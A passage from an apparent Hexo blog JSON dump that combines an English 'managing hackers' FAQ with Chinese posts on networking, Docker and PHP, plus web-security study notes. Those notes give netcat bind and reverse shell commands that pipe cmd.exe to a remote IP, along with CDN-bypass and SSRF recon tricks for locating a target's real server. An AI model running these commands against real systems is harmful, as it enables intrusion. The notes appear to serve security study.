bit confusing; they’re not like most other workers. Don’t worry! Your hacker is likely to be willing to suggest answers to problems, if asked. Most hackers are nearly self-managing.0.3: Wait, you just said “10 times”, didn’t you? You’re not serious, right?Actually, I said “ten times”. And yes, I am serious; a hacker on a roll may be able to produce, in a period of a few months, something that a small development group (say, 7-8 people) would have a hard time getting together over a year. He also may not. Your mileage will vary.IBM used to report that certain programmers might be as much as 100 times as productive as other workers, or more. This kind of thing happens. 0.4: I don’t understand this at all. This is confusing. Is there a book on this?Not yet. In the meantime, check out The New Hacker’s Dictionary (references below; also known as “the jargon file”), in particular some of the appendices. The entire work is full of clarifications and details of how hackers think.Section 1: Social issues1.0: My hacker doesn’t fit in well with our corporate society. She seems to do her work well, but she’s not really making many friends.This is common. Your hacker may not have found any people around who get along with hackers. You may wish to consider offering her a position telecommuting, or flexible hours (read: night shift), which may actually improve her productivity. Or hire another one.1.1: My hacker seems to dress funny. Is there any way to impress upon him the importance of corporate appearance?Your hacker has a very good understanding of the importance of corporate appearance. It doesn’t help you get your job done. IBM, Ford, and Microsoft have all realized that people work better when they can dress however they want. Your hacker is dressed comfortably. A polite request to dress up some for special occasions may well be honored, and most hackers will cheerfully wear clothes without (unintentional) holes in them if specifically asked.1.2: My hacker won’t call me by my title, and doesn’t seem to respect me at all.Your hacker doesn’t respect your title. Hackers don’t believe that management is “above” engineering; they believe that management is doing one job, and engineering is doing another. They may well frequently talk as if management is beneath them, but this is really quite fair; your question implies that you talk as if engineering is beneath you. Treat your hacker as an equal, and she will probably treat you as an equal – quite a compliment!1.3: My hacker constantly insults the work of my other workers.Take your hacker aside, and ask for details of what’s wrong with the existing work. It may be that there’s something wrong with it. Don’t let the fact that it runs most of the time fool you; your hacker is probably bothered by the fact that it crashes at all. He may be able to suggest improvements which could dramatically improve performance, reliability, or other features. It’s worth looking into.You may be able to convince your hacker to be more polite, but if there appear to be major differences, it’s quite possible that one or more of your existing staff are incompetent. Note that hackers, of course, have different standards of competence than many other people. (Read “different” as “much higher”.) Section 2: Productivity.2.0: My hacker plays video games on company time.Hackers, writers, and painters all need some amount of time to spend “percolating” – doing something else to let their subconscious work on a problem. Your hacker is probably stuck on something difficult. Don’t worry about it.2.1: But it’s been two weeks since I saw anything!Your hacker is working, alone probably, on a big project, and just started, right? She’s probably trying to figure it all out in advance. Ask her how it’s going; if she starts a lot of sentences, but interrupts them all with “no, wait…” or “drat, that won’t work”, it’s going well.2.2: Isn’t this damaging to productivity?No. Your hacker needs to recreate and think about things in many ways. He will be more productive with this recreation than without it. Your hacker enjoys working; don’t worry about things getting done reasonably well and quickly.2.3: My hacker is constantly doing things unrelated to her job responsibilities.Do they need to be done? Very few hackers can resist solving a problem when they can solve it, and no one else is solving it. For that matter, is your hacker getting her job done? If so, consider these other things a freebie or perk (for you). Although it may not be conventional, it’s probably helping out quite a bit.2.4: My hacker is writing a book, reading USENET news, playing video games, talking with friends on the phone, and building sculptures out of paper clips. On company time!He sounds happy. The chances are he’s in one of three states:Basic job responsibilities are periodic (phone support, documentation, et al.) and there’s a lull in incoming work. Don’t worry about it!Your hacker is stuck on a difficult problem.Your hacker is bored silly and is trying to find amusement. Perhaps you should find him more challenging work?Any of these factors may be involved. All of them may be involved. In general, if the work is challenging, and is getting done, don’t worry too much about the process. You might ask for your corporation to be given credit in the book. 2.5: But my other workers are offended by my hacker’s success, and it hurts their productivity.Do you really need to have workers around who would rather be the person getting something done, than have it done already? Ego has very little place in the workplace. If they can’t do it well, assign them to something they can do.Section 3: Stimulus and response3.0: My hacker did something good, and I want to reward him.Good! Here are some of the things most hackers would like to receive in exchange for their work:Respect.Admiration.Compliments.Understanding.Discounts on expensive toys.Money.These are not necessarily in order. The 4th item (understanding) is the most difficult. Try to remember this good thing your hacker just did the next time you discover he just spent a day playing x-trek. Rather than complaining about getting work done, write it off as “a perk” that was granted (informally) as a bonus for a job well done. Don’t worry; hackers get bored quickly when they aren’t doing their work. 3.1: My hacker did something bad, and I want to punish him.Don’t. 30 years of psychological research has shown that punishment has no desirable long-term effects. Your hacker is not a lab rat. (Even if he were a lab rat, punishment wouldn’t work; at least, not if he were one of the sorts of lab rats the psych research was done on.) If you don’t like something your hacker is doing, express your concerns. Explain what it is that bothers you about the behavior.Be prepared for an argument; your hacker is a rational entity, and presumably had reasons. Don’t jump on him too quickly; they may turn out to be good reasons. Don’t be afraid to apologize if you’re wrong. If your hacker admits to having been wrong, don’t demand an apology; so far as the hacker is concerned, admitting to being wrong is an apology, most likely. 3.2: I don’t get it. I offered my hacker a significant promotion, and she turned it down and acted offended.A promotion frequently involves spending more time listening to people describing what they’re doing, and less time playing with computers. Your hacker is enjoying her work; if you want to offer a reward, consider an improvement in title, a possible raise, and some compliments. Make sure your hacker knows you are pleased with her accomplishments – that’s what she’s there for.3.3: My company policy won’t let me give my hacker any more raises until he’s in management.Your company policy is broken. A hacker can earn as much as $200 an hour (sometimes more) doing freelance consulting. You may wish to offer your hacker a contracted permanent consulting position with benefits, or otherwise find loopholes. Or, find perks to offer - many hackers will cheerfully accept a discount on hardware from their favorite manufacturer as an effective raise.3.4: I can’t believe the hacker on my staff is worth as much as we’re paying.Ask the other staff in the department what the hacker does, and what they think of it. The chances are that your hacker is spending a few hours a week answering arcane questions that would otherwise require an expensive external consultant. Your hacker may be fulfilling another job’s worth of responsibilities in his spare time around the office. Very few hackers aren’t worth what they’re getting paid; they enjoy accomplishing difficult tasks, and improving worker efficiency.Section 4: What does that mean?4.0: My hacker doesn’t speak English. At least, I don’t think so.Your hacker is a techie. Your best bet is to pick up a copy of TNHD (The New Hacker’s Dictionary). It can be found as http://catb.org/esr/jargon (last I checked) or from a good bookstore. If you have trouble understanding that reference, ask your hacker if she has a copy, or would be willing to explain her terms. Most hackers are willing to explain terms. Be ready for condescension; it’s not intended as an insult, but if you don’t know the words, she probably has to talk down to you at first to explain them.It’s a reasonably difficult set of words; there are a lot of them, and their usage is much more precise than it sounds. Hackers love word games. [It is also possible that English is not your hacker’s native language, and that it’s not yours either. Feel free to substitute a more appropriate language.] 4.1: I can’t get an estimate out of my hacker.Your hacker hasn’t figured out how hard the problem is yet. Unlike most workers, hackers will try very hard to refuse to give an estimate until they know for sure that they understand the problem. This may include solving it.No good engineer goes beyond 95% certainty. Most hackers are good engineers. If you say you will not try to hold him to the estimate (and mean it!) you are much more likely to get an approximate estimate. The estimate may sound very high or very low; it may be very high or very low. Still, it’s an estimate, and you get what you ask for. 4.2: My hacker makes obscure, meaningless jokes.If you feel brave, ask for an explanation. Most of them can be explained. It may take a while, but it may prove interesting.4.3: My hacker counts from zero.So does the computer. You can hide it, but computers count from zero. Most hackers do by habit, also.If you found this information useful, please consider sending a token donation to the author; email for details. You might also consider buying a couple of books through my “affiliate program” link; you get cool books, I get pocket change. :) Recommended books:The links in this section will all try to take you to Powell’s, where you can spend your money on cool books. The Cathedral &amp; the Bazaar (Eric Raymond) - a discussion of different ways of building systems. The New Hacker’s Dictionary (Eric Raymond) - a great source of trivia, lore, and translations for difficult concepts. (Not always in stock, I’m afraid.) https://www.seebs.net/faqs/hacker.html","categories":[],"tags":[]},{"title":"关于光猫折腾","slug":"关于光猫折腾","date":"2023-12-23T17:15:40.000Z","updated":"2023-12-24T18:48:51.140Z","comments":true,"path":"2023/12/24/关于光猫折腾/","link":"","permalink":"http://example.com/2023/12/24/%E5%85%B3%E4%BA%8E%E5%85%89%E7%8C%AB%E6%8A%98%E8%85%BE/","excerpt":"pppoe12345PPP over Ethernet，数字用户线路DSL（Digital Subscriber Line）是以电话线为传输介质的传输数字信号的技术，人们通常把所有的DSL技术统称为xDSL，x代表不同种类的数字用户线路技术。目前比较流行的宽带接入技术为ADSL，ADSL时非对称DSL技术，使用是PPPoE协议。PPPoE协议通过在以太网上提供点到点的连接，建立PPP会话，使的以太网中的主机能够连接到远端的宽带接入服务器上。PPPoE具有使用范围广、安全新高、计费方便等特点。PPP为二层协议，Ethernet为二层协议，PPPoE为将Ethernet跑在PPP的协议之上，PPP报文具有认证功能，所以将PPP封装以太网包中，让PPP协议在以太网环境中对设备进行认证、计费等功能，而PPP不支持广播发送的能力，所以不能完成PPOE认证的过程，所以将PPP跑在Enternet之上，使用PPP进行认证和IP地址的分发，使用Enternet技术实现广播的发送。","text":"pppoe12345PPP over Ethernet，数字用户线路DSL（Digital Subscriber Line）是以电话线为传输介质的传输数字信号的技术，人们通常把所有的DSL技术统称为xDSL，x代表不同种类的数字用户线路技术。目前比较流行的宽带接入技术为ADSL，ADSL时非对称DSL技术，使用是PPPoE协议。PPPoE协议通过在以太网上提供点到点的连接，建立PPP会话，使的以太网中的主机能够连接到远端的宽带接入服务器上。PPPoE具有使用范围广、安全新高、计费方便等特点。PPP为二层协议，Ethernet为二层协议，PPPoE为将Ethernet跑在PPP的协议之上，PPP报文具有认证功能，所以将PPP封装以太网包中，让PPP协议在以太网环境中对设备进行认证、计费等功能，而PPP不支持广播发送的能力，所以不能完成PPOE认证的过程，所以将PPP跑在Enternet之上，使用PPP进行认证和IP地址的分发，使用Enternet技术实现广播的发送。 目的12345## 运营商希望把一个站点上的多台主机连接到同一台远程接入设备，同时接入设备能够提供与拨号上网类似的访问控制和计费功能。在众多的接入技术中，把多个主机连接到接入设备的最经济的方法就是以太网，而PPP协议可以提供良好的访问控制和计费功能，于是产生了在以太网上传输PPP报文的技术，即PPPoE。PPPoE利用以太网将大量主机组成网络，通过一个远端接入设备连入因特网，并运用PPP协议对接入的每个主机进行控制，具有适用范围广、安全性高、计费方便的特点 3.PPPoE拨号的过程 3.1.Discovery阶段1)PPPoE Client广播发送一个PADI（PPPoE Active Discovery Initial）报文，在此报文中包含PPPoE Client想要得到的服务类型信息。 2)所有的PPPoE Server收到PADI报文之后，将其中请求的服务与自己能够提供的服务进行比较，如果可以提供，则单播回复一个PADO（PPPoE Active Discovery Offer）报文。 3)根据网络的拓扑结构，PPPoE Client可能收到多个PPPoE Server发送的PADO报文，PPPoE Client选择最先收到的PADO报文对应的PPPoE Server做为自己的PPPoE Server，并单播发送一个PADR（PPPoE Active Discovery Request）报文。 4)PPPoE Server产生一个唯一的会话ID（Session ID），标识和PPPoE Client的这个会话，通过发送一个PADS（PPPoE Active Discovery Session-confirmation）报文把会话ID发送给PPPoE Client，会话建立成功后便进入PPPoE Session阶段。 完成之后通信双方都会知道PPPoE的Session_ID以及对方的以太网地址，它们共同确定了唯一的PPPoE Session。 3.2.Session阶段PPPoE Session上的PPP协商和普通的PPP协商方式一致，分为LCP、认证、NCP三个阶段。 1)LCP阶段主要完成建立、配置和检测数据链路连接。 2)LCP协商成功后，开始进行认证，认证协议类型由LCP协商结果（CHAP或者PAP）决定。 3)认证成功后，PPP进入NCP阶段。NCP是一个协议族，用于配置不同的网络层协议，常用的是IP控制协议（IPCP），它主要负责协商用户的IP地址和DNS服务器地址。 PPPoE Session的PPP协商成功后，就可以承载PPP数据报文。 在PPPoE Session阶段所有的以太网数据包都是单播发送的。 3.3.Terminate阶段PPP通信双方可以使用PPP协议自身来结束PPPoE会话，当无法使用PPP协议结束会话时可以使用PADT（PPPoE Active Discovery Terminate）报文。 进入PPPoE Session阶段后，PPPoE Client和PPPoE Server都可以通过发送PADT报文的方式来结束PPPoE连接。PADT数据包可以在会话建立以后的任意时刻单播发送。在发送或接收到PADT后，就不允许再使用该会话发送PPP流量了。 ADEL","categories":[],"tags":[]},{"title":"dns解析过程","slug":"dns解析过程","date":"2023-12-23T15:30:18.000Z","updated":"2023-12-23T15:50:41.835Z","comments":true,"path":"2023/12/23/dns解析过程/","link":"","permalink":"http://example.com/2023/12/23/dns%E8%A7%A3%E6%9E%90%E8%BF%87%E7%A8%8B/","excerpt":"","text":"dns解析 ​ 1.首先查看浏览器缓存。缓存有时间会过期，几分钟或几小时 ​ 2.查看本地的c.:&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts ​ &#x2F;etc&#x2F;hosts ​ 3.本机没有就会向本机配置的本地dns域名服务器（ldns）发起请求。如果是学校就是学校dns父亲，如果是小区连接互联网就是互联网提供商，联通电信的dns服务器。linux可以查看，&#x2F;etc&#x2F;resolv.conf查看 4.ldns不能解析，就直接到跟域名服务器。 5.根域名服务器会给本地域名服务器ldns一个所查询的主域名服务器gtld地址。gltd是国际顶级域名服务器，com,cn,org 6.然后ldns在想上一步返回域名gltd发送请求。 7.gtld返回域名对应的name server域名。然后注册域名服务商解析该域名 8.name server域名服务器会查询域名与ip关系表。将ip和ttl值返回dnsserver 9.ldns拿到ip与ttl会缓存。缓存有ttl控制 10.把解析结果返回给用户。用户更具ttl之在本地缓存种。","categories":[],"tags":[]},{"title":"docker","slug":"docker","date":"2023-12-17T11:08:03.000Z","updated":"2023-12-24T17:52:37.754Z","comments":true,"path":"2023/12/17/docker/","link":"","permalink":"http://example.com/2023/12/17/docker/","excerpt":"1.docker12345Docker 通常用来做什么应用分发、部署，方便传播给他人安装。特别是开源软件和提供私有部署的应用快速安装测试/学习软件，用完就丢（类似小程序），不把时间浪费在安装软件上。例如 Redis / MongoDB / ElasticSearch / ELK多个版本软件共存，不污染系统，例如 Python2、Python3，Redis4.0，Redis5.0Windows 上体验/学习各种 Linux 系统","text":"1.docker12345Docker 通常用来做什么应用分发、部署，方便传播给他人安装。特别是开源软件和提供私有部署的应用快速安装测试/学习软件，用完就丢（类似小程序），不把时间浪费在安装软件上。例如 Redis / MongoDB / ElasticSearch / ELK多个版本软件共存，不污染系统，例如 Python2、Python3，Redis4.0，Redis5.0Windows 上体验/学习各种 Linux 系统 2.安装&amp;使用123456sudo pacman -S docker sudo systemctl start dockersudo systemctl enable docker测试sudo docker run hello-world 普通人使用需要掌握知识：docker-comple什么的他是docker的一件启动容器功能。这个软件可以一件话快速部署容器，并且出现问题后可以立刻使用此软件立刻创建其他容器。 docker需要固定持久化的目录。用来存储数据。 docker拉去镜像 1docker pull docker 查看容器 1docker ps docker 查看镜像 1docker image docker 删除容器 1docker rm 名字或id docker创建虚拟网络 1docker network create 具体参数请查阅文档 docker每个容器内部环境都不同，独立隔离。docker有内部端口和外部端口映射这么一说。docker十分方便。文件存储在哪。即使挂了重启挂在同杨目录也能起来服务 docker 不是虚拟机。完全不一样的底层， 问题，今天我在使用docker安装openwrt时出现虚拟化的环境影响到宿主，十年老开发表示这属于很怪的问题， 我重启后，init&#x3D;&#x2F;bin&#x2F;bash绕过system直接启动bash，停止了docker服务。并关闭了docker的自启动 systemctl stop docker systemctl disable docker 然后docker有个命令是查看他的目录。我进去删掉其中的文件。于是就不在自弃，然后顺利删除容器。 这种docker我刚学就遇到这么棘手的问题。实在不想花时间在这上面排查。所以我决定解决问题。而不是排查问题。如了解docker启动原理。核心。底层原理。这不是我的排查范围，我想着破坏docker的文件导致他不能自启动。后续在进行删除，也能保全docker其他的东西。1 群友说：debian虚拟化更成熟。arch不适合在生产环境种运行。、 docker逃逸。感觉很像我这个问题","categories":[],"tags":[]},{"title":"php开发","slug":"php开发","date":"2023-12-16T19:39:00.000Z","updated":"2023-12-24T17:38:07.422Z","comments":true,"path":"2023/12/17/php开发/","link":"","permalink":"http://example.com/2023/12/17/php%E5%BC%80%E5%8F%91/","excerpt":"任务 安装环境： navicat进行操作数据库 Dreamweaver：前端页面设计 phpstorm：php开发 phpstudy：php搭建环境","text":"任务 安装环境： navicat进行操作数据库 Dreamweaver：前端页面设计 phpstorm：php开发 phpstudy：php搭建环境 2.文章功能显示3.数据库操作4.接收数据5.文件操作类6.编辑器7.上传&#x2F;下载&#x2F;读写&#x2F;删除8.输入输出类9.留言板10.访问ip11.ua头12.来源13.登录验证14.cookie &amp;session15.验证码安全16.js17.ajax18.前端逻辑19.购物20.登录21.上传22.tp框架23.路由访问24.安全写法25.历史漏洞 1.文章功能显示","categories":[],"tags":[]},{"title":"web安全day1","slug":"web安全1","date":"2023-12-15T15:47:33.000Z","updated":"2023-12-25T18:39:55.839Z","comments":true,"path":"2023/12/15/web安全1/","link":"","permalink":"http://example.com/2023/12/15/web%E5%AE%89%E5%85%A81/","excerpt":"1.Nc瑞士军刀使用详解1.tcp监听123456789101112131415tcp监听nc可以作为server端启动一个tcp的监听，默认情况下下面监听的是一个tcp的端口nc -l -p 9999客户端测试1、在B机器上telnet A机器此端口，如下显示表示B机器可以访问A机器此端口telnet 10.0.1.161 99992、B机器上也可以使用nmap扫描A机器的此端口nmap 10.0.1.161 -p99993、使用nc命令作为客户端工具进行端口探测nc -vz -w 2 10.0.1.161 9999（-v可视化，-z扫描时不发送数据，-w超时几秒，后面跟数字）服务端会自动关闭监听。4、nc可以扫描连续端口，这个作用非常重要。常常可以用来扫描服务器端口，然后给服务器安全加固在客户端B机器上扫描连续的两个端口，如下nc -vzw 2 10.0.1.161 9998-9999 2.传文件123456789101112131415161718方法1，先启动接收命令使用nc传输文件还是比较方便的，因为不用scp和rsync那种输入密码的操作了把A机器上的一个rpm文件发送到B机器上需注意操作次序，receiver先侦听端口，sender向receiver所在机器的该端口发送数据。 步骤1，先在B机器上启动一个接收文件的监听，格式如下意思是把赖在9995端口接收到的数据都写到file文件里（这里文件名随意取）格式：nc -l port &gt;filenc -l -p 9995 &gt;zabbix.rpm步骤2，在A机器上往B机器的9995端口发送数据，把下面rpm包发送过去nc 10.0.1.162 9995 &lt; zabbix-release-2.4-1.el6.noarch.rpm方法2，先启动发送命令步骤1，先在B机器上，启动发送文件命令下面命令表示通过本地的9992端口发送test.mv文件nc -l -p 9992 &lt;test.mv步骤2，A机器上连接B机器，取接收文件下面命令表示通过连接B机器的9992端口接收文件，并把文件存到本目录下，文件名为test2.mvnc 10.0.1.162 9992 &gt;test2.mv","text":"1.Nc瑞士军刀使用详解1.tcp监听123456789101112131415tcp监听nc可以作为server端启动一个tcp的监听，默认情况下下面监听的是一个tcp的端口nc -l -p 9999客户端测试1、在B机器上telnet A机器此端口，如下显示表示B机器可以访问A机器此端口telnet 10.0.1.161 99992、B机器上也可以使用nmap扫描A机器的此端口nmap 10.0.1.161 -p99993、使用nc命令作为客户端工具进行端口探测nc -vz -w 2 10.0.1.161 9999（-v可视化，-z扫描时不发送数据，-w超时几秒，后面跟数字）服务端会自动关闭监听。4、nc可以扫描连续端口，这个作用非常重要。常常可以用来扫描服务器端口，然后给服务器安全加固在客户端B机器上扫描连续的两个端口，如下nc -vzw 2 10.0.1.161 9998-9999 2.传文件123456789101112131415161718方法1，先启动接收命令使用nc传输文件还是比较方便的，因为不用scp和rsync那种输入密码的操作了把A机器上的一个rpm文件发送到B机器上需注意操作次序，receiver先侦听端口，sender向receiver所在机器的该端口发送数据。 步骤1，先在B机器上启动一个接收文件的监听，格式如下意思是把赖在9995端口接收到的数据都写到file文件里（这里文件名随意取）格式：nc -l port &gt;filenc -l -p 9995 &gt;zabbix.rpm步骤2，在A机器上往B机器的9995端口发送数据，把下面rpm包发送过去nc 10.0.1.162 9995 &lt; zabbix-release-2.4-1.el6.noarch.rpm方法2，先启动发送命令步骤1，先在B机器上，启动发送文件命令下面命令表示通过本地的9992端口发送test.mv文件nc -l -p 9992 &lt;test.mv步骤2，A机器上连接B机器，取接收文件下面命令表示通过连接B机器的9992端口接收文件，并把文件存到本目录下，文件名为test2.mvnc 10.0.1.162 9992 &gt;test2.mv 3.nc反弹shell123456789101112131415161718方法1、REMOTE主机绑定SHELL在公网监听nc -l -p 5354 -t -e c:\\winnt\\system32\\cmd.exe或者nc -l -p 5555 -t -e cmd.exe在内网主动建立连接nc -nvv 192.168.153.138 5555-t是通过telne模式执行 cmd.exe 程序，可以省略。讲解：绑定REMOTE主机的CMDSHELL在REMOTE主机的TCP5354端口方法2、REMOTE主机绑定SHELL并反向连接在公网监听nc -lp 5555在内网机器反弹nc -t -e c:\\winnt\\system32\\cmd.exe 192.168.x.x 5354或者nc -t -e cmd 192.168.153.140 5555讲解：绑定REMOTE主机的CMDSHELL并反向连接到192.168.x.x的TCP5354端口 2.加解密12345678910111213md5 16位和32位 0-9 和a-f 组成的字符串 解密： 1.知道算法 2.碰撞枚举生成密文 有特殊情况。md5会加salt一个字符串。 discuz 12SHA1和md5特征差不多，只是位数是40 1234NTLMWINDOWS系统哈希密码，标准通讯安全协议win7之后使用的密码之前是LM 12aes，des，rc4都是非对称加密。印度密钥，密文特质与base64类似 大小写敏感 1base64 通常以=结尾、1-9 a-f 1url 通常以=结尾、1-9 a-f 通常以%数字字母分割 1234编码gbk，utf-8 颜文字加密：aaencode12jother： +()[]&#123;&#125;jsfuck是和jother很像。少了&#123;&#125; 图片里包含文件的技术3.判断操作系统ttl123456WINDOWS NT/2000 TTL：128WINDOWS 95/98 TTL：32UNIX TTL：255LINUX TTL：64WIN7 TTL：64 nmap使用技术可以具体了解判定方法 4.数据库判定​ 端口扫描 1234567mysql 3306oracle 1521sql server 1433db2 5000 5.主动打点和被动打点12主动式信息打点：主动使用工具、主动发起测试流量等被动式信息打点：调用接口获取信息等 6.收集 操作系统 脚本语言 数据库 源码名称 7.泄露原码（cms找不到的情况）git和svn1234githack原理 .gitsvnhack原理 .svn 目录备份1目录扫描秒了 DsStore12mac的上传软件ds_store PHP源码泄露123456java有mavennode.js有npmphp有composer composer.json配置文件 里面有配置信息。插件。中间件信息 WEB-INF&#x2F;web.xml1web-inf 是java的web应用安全目录，要是想访问文件。必须在web.xml文件对要访问的文件进行映射 8.信息收集github的readme邮箱，版权声明。域名常用搜索。 9。端口扫描 网络架构。 内网资产，内网协议 阻碍信息，cdn，waf。负载，防火墙。 端口（1-65535） 12nmap 协议。端口扫描。防火墙识别masscan 协议，端口扫描、 10.端口渗透11.c段&#x2F;旁注旁注1234171.40.78.44www.123.comwww.44.comwww.54454.com c段12然后用ip反查查看绑定域名。可以进去看看资产同网段渗透 cdn判断1超级ping。全国各地ping一下秒了 waf判断https://www.wangan.com/p/11v71302b8c5ab87 12工具 wafw00f 负载均衡12工具： lbd cdn绕过12345678910111213141516171.子域名查询。有些子域名没有加速cdn比如你直接访问 www.baidu.com他如果没买*.baidu.com那么访问test.baidu.com baidu.com都会暴露真实ip 注意！！！！！！！！当然这建立在主域名和子域名同个服务器。有些吊毛不这样做2.利用网站漏洞暴露真实ip3.历史dns记录4.MX5.国外请求(仅限中国大陆策略下) 全球cdn查询:tools.ipip.net 找冷们cdn。他一定不会部署cdn6.zmap7.网络空间搜索引擎： zoomeye。fofa、shodan8.部分加速的就可以看网络请求包 12漏洞&amp;遗留文件 像是有些配置文件。比如phpInfo.php里面就会配置ip地址.从而得知真实ip，适用于没有内网网卡。 12345678910111213141516171819202122231.传统访问：访问域名-&gt;dns-&gt;目标主机2.cdn瑞克派：访问域名-&gt;cdn-&gt;3.访问域名-&gt;-&gt;4. 主动邮件配合备案 让对方服务器主动发邮件给你（注册、找回密码等功能）5.抓APP包: 有时候网站使用了CDN，但是可能其APP没有使用，那么通过抓取APP的数据包有可能得出真实的IP地址6.国外第三方测试CDN网站（结合了几种方法于一身） https://get-site-ip.com/7.查看历史解析IP https://site.ip138.com/ https://viewdns.info/8.全网扫描FuckCDN(没有办法的办法) 厂商查询： https://tools.ipip.net/cdn.php IP库筛地址段 https://www.cz88.net/geo-public //IP库资源,要下载客户端 全网扫描： https://github.com/Tai7sy/fuckcdn9.ssrf漏洞 想办法让对方主机访问你，你自己弄个web服务，监听个端口，记录日志。 然后通过漏洞·让对方访问你，于是就得到ip&#x27;了 牛逼的工具​ get-site-ip.com 找到cdn后咋办？12绑定host文件直接指向真实ip后期测试测对地方 正向连接和反向连接正向连接​ 1正向连接是受害主机监听一个端口，由控制主机主动去连接受害主机的过程，适用于受害主机具有[公网ip](https://so.csdn.net/so/search?q=公网ip&amp;spm=1001.2101.3001.7020)的情况下。例如下面，受害主机具有公网ip，被控主机kali可以通过ip地址访问到受害主机，所以能够使用正相连接来控制受害主机。 反向连接123反向连接是控制主机监听一个端口，由受害主机反向去连接控制主机的过程，适用于受害主机出网（或出网且没有公网ip）的情况。例如，受害主机是一台位于内网，并且没有公网ip且能访问互联网的主机，控制主机无法直接通过ip地址访问到受害主机。所以此时需要在控制主机上监听一个端口，让受害机主动连接控制主机，从而实现对控制主机的控制。由于正向连接是被攻击者主动连接攻击者，所以不受防火墙策略的限制 逆向方向代码分析&amp;抓包分析 app&amp;&amp;小程序 收集app里的所有地址，收集所有请求。api oss阿里云的服务，他又他的客户端。存储资源 抓包封包 逆向二进制 反框架检测 工具 内在搜索：appinfoScanner自动反编译1移动端，ios，web，hs。静态网站信息收集工具。基本信息收集，title。dormain。cdn。指纹信息。状态信息，内在提取。反编译收集 idea手动反编译内在搜索安卓修改大师1可以连接真机去抓包","categories":[],"tags":[]},{"title":"linux运维技术","slug":"linux运维技术","date":"2023-12-11T12:50:45.000Z","updated":"2023-12-11T12:50:45.380Z","comments":true,"path":"2023/12/11/linux运维技术/","link":"","permalink":"http://example.com/2023/12/11/linux%E8%BF%90%E7%BB%B4%E6%8A%80%E6%9C%AF/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"论游戏开发从代码到图像互动","slug":"论游戏开发从代码到图像互动","date":"2023-12-05T00:36:17.000Z","updated":"2023-12-24T17:38:37.504Z","comments":true,"path":"2023/12/05/论游戏开发从代码到图像互动/","link":"","permalink":"http://example.com/2023/12/05/%E8%AE%BA%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91%E4%BB%8E%E4%BB%A3%E7%A0%81%E5%88%B0%E5%9B%BE%E5%83%8F%E4%BA%92%E5%8A%A8/","excerpt":"只在大学学了点c皮毛的门外汉想问一下这些c++代码是怎么和那些图形界面联系起来的，一直无法理解命令行是怎么到游戏画面的?","text":"只在大学学了点c皮毛的门外汉想问一下这些c++代码是怎么和那些图形界面联系起来的，一直无法理解命令行是怎么到游戏画面的? 1234567891011121314151617你好，我之前学过一些游戏开发，我尽量通俗地解答你的疑问真实开发游戏时，我们既不会用非常原始的调用图形API来几乎从零开始做游戏，也不会只用游戏引擎提供的插件点点鼠标而不写一行代码。而是在游戏引擎提供的基础套件上用c++或c#这类的高级程序语言编写游戏逻辑。你用这些高级程序语言和游戏引擎打交道，游戏引擎负责和图形API打交道，图形API和你的CPU和显卡打交道。当然，游戏引擎也不只是封装了与图形相关的操作，也封装了很多游戏中都需要用到的物理操作，例如游戏物体中的碰撞系统，还封装了一些人机交互的操作例如和手柄键盘鼠标等外设打交道。诸如此类的，游戏引擎将大多数游戏都需要用到的操作封装起来方便程序员调用。最简单的，在unity里面你想要让你按下w键时，你的人物以每秒5m的速度向z轴正方向跑，只需要在你的人物上挂一个继承了monobehaviour的脚本，在update函数里写下这么一行代码就行：if（Input.Getkey(&quot;w&quot;)）&#123;transform.z+=5*0.02//假设帧间隔为0.02秒，即每秒50帧&#125;那么由于update函数每一帧执行一次，所以一秒后你的人物的位置确确实实地前进了5米。当然，这么干你会看到你的人物身体一动不动地匀速前进了5米，如果你需要让人物变速运动，以及让他能用上美术人员设计的奔跑动画，那就需要更复杂的代码来堆砌以完成复杂的游戏逻辑。总而言之，游戏引擎给你提供的是一个方便的框架。游戏引擎并不是只有图形化的拖来拖去的鼠标操作，虽然unreal engine的蓝图和unity的一些插件确实能够让新手不用敲一行代码就写出一个看起来很棒的游戏，但封装层次越高，也就意味着丧失了更多的自由度。只是鼠标拖来拖去是满足不了很多场景下的开发需求的。而另一个极端就是只采取像opengl这类的图形API从零开始做游戏。你可以把opengl简单地理解为一堆提供了与图形相关的函数。你可以调用这些函数在屏幕上画点，画线，画三角形，从而画出各种各样的多面体。 1不太专业地说，就像你向命令行输出要标准输入输出API（像printf）一样，绘制图形也需要图形库API，比如OpenGL、DirectX等，代码负责描述要绘制的东西，通过这些API与硬件交互，比如交付给显卡，然后显卡就将代码描述的东西绘制出来，输出到屏幕上，当然，实际流程没那么简单，会有很多细节，这里只说个大概 GTA罪恶都市源代码解读第一期（主函数、初始化逻辑）渲染引擎开发者解读R星代码_哔哩哔哩bilibili_罪恶都市 本文章来自b站视频下的评论。","categories":[],"tags":[]},{"title":"关于hexo主题修改","slug":"关于hexo主题修改","date":"2023-12-02T12:11:16.000Z","updated":"2023-12-24T17:38:20.215Z","comments":true,"path":"2023/12/02/关于hexo主题修改/","link":"","permalink":"http://example.com/2023/12/02/%E5%85%B3%E4%BA%8Ehexo%E4%B8%BB%E9%A2%98%E4%BF%AE%E6%94%B9/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"网络工程师知识","slug":"网络工程师知识","date":"2023-12-01T16:16:43.000Z","updated":"2023-12-24T10:15:57.239Z","comments":true,"path":"2023/12/02/网络工程师知识/","link":"","permalink":"http://example.com/2023/12/02/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%B8%88%E7%9F%A5%E8%AF%86/","excerpt":"因为要混饭吃，被迫学习网络知识，顺便了解一下物理的网络结构 申明因为是自己用来学习的，大部分前辈都进行了很好的总结，我会将互联网各种资料整合起来,再加上自己的理解来写这篇文章，仅供个人学习用途 正文常见的网络设备1.网络交换机交换机使用内容可寻址存储器(Content Addressable Memory, CAM), 因此可以记住设备所插入的端口。思科公司生产的交换机被设计可用于从小型机构到有数千台设备的大型企业网络。 交换机的基本功能是利用设备的 MAC 地址（第二层）和 IP 地址（第三层）来运行，它们也能完成更为复杂的一些工作，比如包括基于 permit/deny（运行或访问）、协议及端口号（第四层），还有综合各层及其它方面的策略和规则的处理列表（porcessing lists）。 早期版本的交换机又被叫做网桥。网桥查看数据帧的源端口和 MAC 地址，以建立一个表并做出转发决定。在网桥上，有相应软件来访问这个表，在交换机上，则是由硬件（专用集成电路， Application Specific Integreated Chips, ASIC）去访问 CAM 表。因此交换机可以看成是一台多端口网桥。 